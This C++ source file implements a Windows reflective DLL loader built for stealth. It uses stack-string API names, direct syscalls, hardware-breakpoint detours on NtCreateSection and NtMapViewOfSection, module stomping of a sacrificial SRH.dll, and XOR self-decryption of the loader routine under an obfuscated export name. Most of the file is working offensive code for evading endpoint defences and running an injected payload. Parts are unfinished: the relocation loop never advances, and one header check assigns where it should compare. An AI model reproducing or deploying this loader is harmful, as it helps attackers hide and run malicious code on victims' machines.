#include "pch.h"
#include "headers.h"
#include "syscalls.h"
#include "misc.h"
#include "hwbp.h"

EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
{
	//PE HEADERS VARS
	PIMAGE_DOS_HEADER	img_dos_hdr = NULL;
	PIMAGE_NT_HEADERS	img_nt_hdrs = NULL;
	IMAGE_OPTIONAL_HEADER	ImgOptHdr = { 0 };
	IMAGE_FILE_HEADER img_file_hdr = { 0 };

	PIMAGE_SECTION_HEADER* pe_sections = NULL;
	PIMAGE_IMPORT_DESCRIPTOR img_imp_desc = NULL;
	PIMAGE_THUNK_DATA64 original_first_thunk = NULL;
	PIMAGE_THUNK_DATA64 first_thunk = NULL;
	PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
	PIMAGE_BASE_RELOCATION img_reloc = NULL;
	PBASE_RELOCATION_ENTRY reloc_entry = NULL;
	PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFunctionEntry = NULL;
	PIMAGE_TLS_DIRECTORY pImgTlsDirectory = NULL;
	PIMAGE_TLS_CALLBACK* arrayOfCallbacks = NULL;



	//fix IAT vars
	HMODULE dll = NULL;
	FARPROC import_func_address = NULL;
	int import_func_ordinal = 0;


	//base relocation vars
	ULONG_PTR delta = NULL;
	int entries_count;

	//fix Memory Protection variables
	DWORD dwProtection = 0x00;


	//locate DLL in memory
	PDLL_HEADER dll_hdr = NULL;
	ULONG_PTR reflective_dll_base = NULL;

	//new PE in memory and memory to free once loaded
	PBYTE pebase = NULL;
	PBYTE mem_to_free = NULL;

	//function prototpyes
	fnLoadLibraryA func_LoadLibraryA = NULL; //to fix the IAT
	fnRtlAddFunctionTable func_RtlAddFunctionTable = NULL;
	fnLoadLibraryExA func_LoadLibraryExA = NULL;//to load sac dll without resolving imports

	//stack strings for PIC
	WCHAR str_Kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR str_ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR str_user32[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	CHAR str_RtlAddFunctionTable[] = { 'R', 't', 'l', 'A', 'd', 'd', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', 'T', 'a', 'b', 'l', 'e', '\0' };
	CHAR str_LoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
	CHAR str_LoadLibraryExA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'E', 'x', 'A','\0' };
	CHAR str_GetProcessId[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0' };


	//stack strings and variables for HBP
	CHAR str_AddVectoredExceptionHandler[] = { 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
	CHAR str_RemoveVectoredExceptionHandler[] = { 'R', 'e', 'm', 'o', 'v', 'e', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
	PVOID addr_ZwClose = NULL;
	PVOID addr_NtMapViewOfSection = NULL;
	PVOID addr_NtCreateSection = NULL;
	CHAR str_ZwClose[] = { 'Z','w','C','l','o','s','e','\0' };
	CHAR str_NtMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
	CHAR str_NtCreateSection[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };


	//NT status variable for syscall return code
	NTSTATUS status = 0x00;

	HMODULE hm_kernel32 = GMHR(str_Kernel32);
	HMODULE hm_ntdll = GMHR(str_ntdll);

	fnAddVectoredExceptionHanlder func_AddVectoredExceptionHandler = (fnAddVectoredExceptionHanlder)GPAR(hm_kernel32, str_AddVectoredExceptionHandler);
	fnRemoveVectoredExceptionHandler func_RemoveVectoredExceptionHandler = (fnRemoveVectoredExceptionHandler)GPAR(hm_kernel32, str_RemoveVectoredExceptionHandler);

	if ((func_LoadLibraryExA = (fnLoadLibraryExA)GPAR(hm_kernel32, str_LoadLibraryExA)) == NULL)
		return FALSE;
	if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR(hm_kernel32, str_LoadLibraryA)) == NULL)
		return FALSE;
	if (!(func_RtlAddFunctionTable = (fnRtlAddFunctionTable)GPAR(hm_kernel32, str_RtlAddFunctionTable)))
		return FALSE;

	SYSCALL_ENTRY zw_func_s[AmountofSyscalls] = { 0 };
	retrieve_zw_func_s(GMHR(str_ntdll), zw_func_s);


	/* set hardware breakpoint and detour functions */
	func_AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);

	addr_ZwClose = GPAR(hm_ntdll, str_ZwClose);
	addr_NtMapViewOfSection = GPAR(hm_ntdll, str_NtMapViewOfSection);
	addr_NtCreateSection = GPAR(hm_ntdll, str_NtCreateSection);

	if (addr_ZwClose != NULL
		&& addr_NtCreateSection != NULL
		&& addr_NtMapViewOfSection != NULL
		)
	{
		set_hwbp(DrIndex::DR1, addr_ZwClose, zw_func_s);
		set_hwbp(DrIndex::DR2, addr_NtMapViewOfSection, zw_func_s);
		set_hwbp(DrIndex::DR3, addr_NtCreateSection, zw_func_s);
	}

	/* brute force reflective dll base address search */
	reflective_dll_base = (ULONG_PTR)ReflectiveFunction;
	while (TRUE)
	{
		dll_hdr = (PDLL_HEADER)reflective_dll_base;
		if (dll_hdr->header = 0x44434241)
		{
			img_dos_hdr = (PIMAGE_DOS_HEADER)(reflective_dll_base + (16));
			if (img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
			{
				img_nt_hdrs = (PIMAGE_NT_HEADERS)(reflective_dll_base + img_dos_hdr->e_lfanew + 16);

				if (img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
					break;
			}

		}
		reflective_dll_base--;
	}


	// here it still needs to be adjusted because there are the headers in
	// between, check some lines later

	if (!reflective_dll_base)
		return FALSE;

	mem_to_free = (PBYTE)reflective_dll_base;

	PIMAGE_OPTIONAL_HEADER img_opt_hdr = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)img_nt_hdrs
		+ sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)); // skip nt_hdrs->Signature

	img_file_hdr = img_nt_hdrs->FileHeader;

	/*------------------------------LOADING SACRIFICAL DLL---------------------*/

	PBYTE sac_dll_base = NULL;
	CHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };

	HMODULE sac_dll_module = NULL;
	sac_dll_module = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);

	unset_hwbp(DrIndex::DR1);
	unset_hwbp(DrIndex::DR2);
	unset_hwbp(DrIndex::DR3);

	func_RemoveVectoredExceptionHandler((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);

	sac_dll_base = (PBYTE)sac_dll_module;

	/* parse sacrificial dll to retrieve the size */
	PIMAGE_DOS_HEADER sac_dll_img_dos_hdr_ptr = NULL;
	PIMAGE_NT_HEADERS sac_dll_img_nt_hdr_ptr = NULL;
	PVOID sac_dll_mem_addr_for_syscall = NULL;
	SIZE_T sac_dll_payload_size_for_syscall = NULL;
	ULONG sac_dll_u_old_protection = NULL;

	if (sac_dll_base == NULL)
	{
		return FALSE;
	}

	sac_dll_img_dos_hdr_ptr = (PIMAGE_DOS_HEADER)sac_dll_base;
	if (sac_dll_img_dos_hdr_ptr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	sac_dll_img_nt_hdr_ptr = (PIMAGE_NT_HEADERS)(sac_dll_base + sac_dll_img_dos_hdr_ptr->e_lfanew);
	if (sac_dll_img_nt_hdr_ptr->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	sac_dll_mem_addr_for_syscall = (PVOID)(sac_dll_base);
	sac_dll_payload_size_for_syscall = (SIZE_T)sac_dll_img_nt_hdr_ptr->OptionalHeader.SizeOfImage;


	HANDLE sac_dll_handle = find_SRH_DLL_section_handle(zw_func_s, (fnGetProcessId)GPAR(hm_kernel32, str_GetProcessId));

	PVOID sac_dll = NULL;
	HANDLE dll_file = NULL;
	HANDLE section_handle = NULL;
	SIZE_T view_size = NULL;

	sac_dll_payload_size_for_syscall = sac_dll_payload_size_for_syscall + 24;
	LARGE_INTEGER section_size = { sac_dll_payload_size_for_syscall };

	if (status = ZwCreateSection(
		&section_handle,
		SECTION_ALL_ACCESS,
		NULL,
		&section_size,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL,
		zw_func_s[ZwCreateSectionF].SSN,
		zw_func_s[ZwCreateSectionF].sysretAddr
	) != 0)
		return FALSE;

	// unmap the view of section of the SRH.dll mapped by LoadLibraryExA()
	if (status = ZwUnmapViewOfSection(
		((HANDLE)(LONG_PTR)-1),
		sac_dll_module,
		zw_func_s[ZwUnmapViewOfSectionF].SSN,
		zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
	) != 0)
		return FALSE;

	sac_dll = (PVOID)sac_dll_module;
	if (status = ZwMapViewOfSection(
		section_handle,
		((HANDLE)(LONG_PTR)-1),
		&sac_dll,
		NULL,
		NULL,
		NULL,
		&sac_dll_payload_size_for_syscall,
		ViewUnmap,
		NULL,
		PAGE_EXECUTE_READWRITE,
		zw_func_s[ZwMapViewOfSectionF].SSN,
		zw_func_s[ZwMapViewOfSectionF].sysretAddr
	) != 0)
		return FALSE;

	// fixing the base address including the 16 bytes of header.
	reflective_dll_base = reflective_dll_base + (16);

	pebase = (PBYTE)sac_dll;
	custom_memcpy_classic(pebase, &sac_dll_handle, sizeof(HANDLE));
	pebase += sizeof(HANDLE);
	custom_memcpy_classic(pebase, &section_handle, sizeof(HANDLE));
	pebase += sizeof(HANDLE);
	custom_memcpy_classic(pebase, &sac_dll_payload_size_for_syscall, sizeof(SIZE_T));
	pebase += sizeof(HANDLE);
	custom_memcpy_classic(pebase, &mem_to_free, sizeof(PBYTE));
	pebase += sizeof(PBYTE);

	PVOID pe_section_temp = NULL;
	SIZE_T s_size = 0x0;
	s_size = sizeof(PIMAGE_SECTION_HEADER) * img_file_hdr.NumberOfSections;

	if ((status = ZwAllocateVirtualMemory(
		((HANDLE)(LONG_PTR)-1),
		&pe_section_temp,
		0,
		&s_size,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE,
		zw_func_s[ZwAllocateVirtualMemoryF].SSN,
		zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
	)) != 0)
		return FALSE;

	

	pe_sections = (PIMAGE_SECTION_HEADER*)pe_section_temp;

	if (pe_sections == NULL)
		return FALSE;

	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
	{
		pe_sections[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)img_nt_hdrs) + 4 + 20 + img_file_hdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));
	}

	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
	{
		custom_memcpy(
			(PVOID)(pebase + pe_sections[i]->VirtualAddress),
			(PVOID)(reflective_dll_base + pe_sections[i]->PointerToRawData),
			pe_sections[i]->SizeOfRawData,
			(PBYTE)(ReflectiveFunction),
			dll_hdr->funcSize
		);
	}

	/* FIX IAT TABLE */
	for (size_t i = 0; i < img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
	{

		img_imp_desc = (PIMAGE_IMPORT_DESCRIPTOR)(pebase + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);
		if (img_imp_desc->OriginalFirstThunk == NULL && img_imp_desc->FirstThunk == NULL)
			break;

		dll = func_LoadLibraryA((LPSTR)(pebase + img_imp_desc->Name));
		if (dll == NULL)
			return FALSE;

		original_first_thunk = (PIMAGE_THUNK_DATA64)(pebase + img_imp_desc->OriginalFirstThunk);
		first_thunk = (PIMAGE_THUNK_DATA64)(pebase + img_imp_desc->FirstThunk);

		while (original_first_thunk->u1.Function != NULL && first_thunk->u1.Function != NULL)
		{
			if (original_first_thunk->u1.Ordinal & 0x8000000000000000)
			{
				import_func_ordinal = original_first_thunk->u1.Ordinal & 0xFFFF;
				import_func_address = GPARO(dll, (int)import_func_ordinal);
				if (import_func_address != nullptr)
					first_thunk->u1.Function = (ULONGLONG)import_func_address;
			}
			else
			{
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pebase + original_first_thunk->u1.AddressOfData);
				import_func_address = GPAR(dll, pImgImportByName->Name);
				if (import_func_address != nullptr)
					first_thunk->u1.Function = (ULONGLONG)import_func_address;
			}

			original_first_thunk++;
			first_thunk++;
		}

	}

	/* APPLE BASE RELOCATIONS */
	delta = (ULONG_PTR)pebase - img_opt_hdr->ImageBase;
	img_reloc = (PIMAGE_BASE_RELOCATION)(pebase + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	while (img_reloc->VirtualAddress)
	{
		reloc_entry = (PBASE_RELOCATION_ENTRY)(img_reloc + 1);
		entries_count = (int)((img_reloc->SizeOfBlock - 8) / 2);

		for (int i = 0; i < entries_count; i++)
		{
			switch (reloc_entry->Type)
			{
			case IMAGE_REL_BASED_DIR64:
			{
				ULONGLONG* to_adjust = (ULONGLONG*)(pebase + img_reloc->VirtualAddress + reloc_entry->Offset);
				*to_adjust += (ULONGLONG)delta;
			}
			break;
			case IMAGE_REL_BASED_HIGHLOW:
			{
				DWORD* to_adjust = (DWORD*)(pebase + img_reloc->VirtualAddress + reloc_entry->Offset);
				*to_adjust += (DWORD)delta;
			}
			break;
			case IMAGE_REL_BASED_HIGH:
			{
				WORD* to_adjust = (WORD*)(pebase + img_reloc->VirtualAddress + reloc_entry->Offset);
				*to_adjust += HIWORD(delta);
			}
			

			default:
				break;
			}
		}


	}








	


}

EXTERN_DLL_EXPORT bool _123321_asdf21425()
{
	WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	CHAR str_create_thread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d','\0' };

	fnCreateThread fn_create_thread = NULL;
	if ((fn_create_thread = (fnCreateThread)GPAR(GMHR(kernel32), str_create_thread)) == NULL)
		return FALSE;

	fnDllMain p_dll_main = NULL;
	PBYTE pebase = NULL;
	PIMAGE_DOS_HEADER p_img_dos_hdr = NULL;
	PIMAGE_NT_HEADERS p_img_nt_hdrs = NULL;
	PDLL_HEADER p_dll_header = NULL;
	ULONG_PTR dll_base_addr = NULL;

	// lea rax, [rip + 0x0]
	dll_base_addr = (ULONG_PTR)_123321_asdf21425;

	while (TRUE)
	{

		p_dll_header = (PDLL_HEADER)dll_base_addr;

		if (p_dll_header->header == 0x44434241) {
			p_img_dos_hdr = (PIMAGE_DOS_HEADER)(dll_base_addr + sizeof(DLL_HEADER));
			if (p_img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
			{
				p_img_nt_hdrs = (PIMAGE_NT_HEADERS)(dll_base_addr + p_img_dos_hdr->e_lfanew + sizeof(DLL_HEADER));

				if (p_img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
				{
					break;
				}
			}
		}

		dll_base_addr--;

	}

	if (!dll_base_addr)
		return FALSE;

	PBYTE reflective_addr = NULL;
	BYTE KEY[4] = {
		(BYTE)(p_dll_header->key & 0xFF),
		(BYTE)((p_dll_header->key >> 8) & 0xFF),
		(BYTE)((p_dll_header->key >> 16) & 0xFF),
		(BYTE)((p_dll_header->key >> 24) & 0xFF),
	};

	reflective_addr = (PBYTE)ReflectiveFunction;

	// decrypting the reflective function
	for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
	{
		//if (j >= sizeof(p_dll_header->key))
		//{
		//	j = 0;
		//}
		reflective_addr[i] = reflective_addr[i] ^ KEY[j % 4];
	}

	pebase = ReflectiveFunction();

	// re-encrypting the reflective function
	for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
	{
		//if (j >= sizeof(p_dll_header->key))
		//{
		//	j = 0;
		//}
		reflective_addr[i] = reflective_addr[i] ^ KEY[j % 4];
	}

	p_dll_header->key = { 0 };

	p_dll_main = (fnDllMain)(pebase + p_img_nt_hdrs->OptionalHeader.AddressOfEntryPoint);

	HANDLE h_thread = fn_create_thread(
		NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
		(LPVOID)p_dll_main, 0, NULL
	);

	if (h_thread == NULL)
		return FALSE;

	return TRUE;

}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		PBYTE old_memory = NULL;

		// even if unmapped it's in the PEB
		PBYTE self_base = (PBYTE)GetModuleHandleA("SRH.dll");

		// retrieve the information left from the reflective loader
		PHANDLE p_handle = (PHANDLE)self_base;
		HANDLE sac_dll = *p_handle;



	}

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

